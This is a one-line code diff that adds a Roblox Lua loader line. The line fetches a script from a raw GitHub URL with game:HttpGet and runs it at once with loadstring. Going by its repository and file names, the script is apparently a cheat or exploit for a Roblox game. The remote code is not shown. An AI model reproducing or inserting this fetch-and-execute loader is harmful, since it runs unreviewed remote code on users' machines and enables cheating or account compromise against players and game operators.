@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/build-a-base-steal-plants-co-op-spam2-44f8nmbyhs58z4.lua"))()
